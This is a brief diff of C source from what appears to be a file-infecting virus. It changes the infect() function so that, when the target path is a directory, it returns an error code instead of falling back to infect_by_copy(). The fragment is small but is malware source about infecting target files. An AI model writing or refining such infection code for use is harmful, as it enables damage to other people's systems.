@@ -245,7 +245,9 @@ int infect(const char *virus, const virus_info_t *info, const char *path) {
 
     int fd = open(path, O_RDWR);
     if (fd == -1) {
-        return infect_by_copy(virus, info, path);
+        return errno == EISDIR
+            ? errno
+            : infect_by_copy(virus, info, path);
     }
 
     struct stat stat;
